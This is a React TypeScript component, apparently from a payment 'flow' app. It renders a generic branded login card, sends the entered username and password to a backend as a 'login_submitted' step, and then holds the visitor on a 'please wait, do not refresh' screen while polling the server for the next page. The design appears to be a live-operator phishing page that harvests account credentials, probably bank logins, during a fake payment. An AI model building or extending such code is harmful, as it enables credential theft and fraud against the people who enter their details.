import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button, PasswordInput, TextInput } from "@mantine/core";
import { ShieldCheck } from "lucide-react";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import styles from "./FlowPages.module.scss";

export function FlowLoginPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "login",
    enabled: submitted && !!reference,
  });

  const handleSubmit = async () => {
    if (!login.trim() || !password) {
      setError("Please fill all fields");
      return;
    }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "login_submitted", {
        login,
        password,
      });
      setSubmitted(true);
    } catch {
      setError("Network error — please try again");
    } finally {
      setBusy(false);
    }
  };

  if (!reference) {
    navigate("/", { replace: true });
    return null;
  }

  return (
    <div className={styles.flowPage}>
      <div className={styles.flowCard}>
        <div className={styles.flowLogo}>
          <ShieldCheck size={44} color="#8b1a3a" />
        </div>
        <p className={styles.flowTitle}>Login</p>
        <p className={styles.flowSubtitle}>Enter your account credentials</p>

        <TextInput
          label="Username / Email"
          placeholder="username or email"
          value={login}
          onChange={(e) => setLogin(e.currentTarget.value)}
          mb="sm"
        />
        <PasswordInput
          label="Password"
          placeholder="••••••••"
          value={password}
          onChange={(e) => setPassword(e.currentTarget.value)}
          mb="sm"
        />

        {error && (
          <p
            style={{ color: "#991b1b", fontSize: "0.85rem", marginBottom: 10 }}
          >
            {error}
          </p>
        )}

        <Button
          fullWidth
          loading={busy}
          onClick={handleSubmit}
          className={styles.submitBtn}
          styles={{
            root: {
              background: "#8b1a3a",
              "&:hover": { background: "#751532" },
            },
          }}
        >
          Login
        </Button>
      </div>

      {submitted && (
        <div className={styles.loadingWrap}>
          <div className={styles.spinnerOuter}>
            <div className={styles.spinnerInner} />
          </div>
          <p className={styles.loadingTitle}>Please wait</p>
          <p className={styles.loadingSubtitle}>Processing your information</p>
          <div className={styles.loadingNoteBox}>
            <p className={styles.loadingNote}>
              Please do not leave or refresh this page until the process is
              complete
            </p>
          </div>
          <div className={styles.dots}>
            <span className={styles.dot} />
            <span className={styles.dot} />
            <span className={styles.dot} />
          </div>
        </div>
      )}
    </div>
  );
}
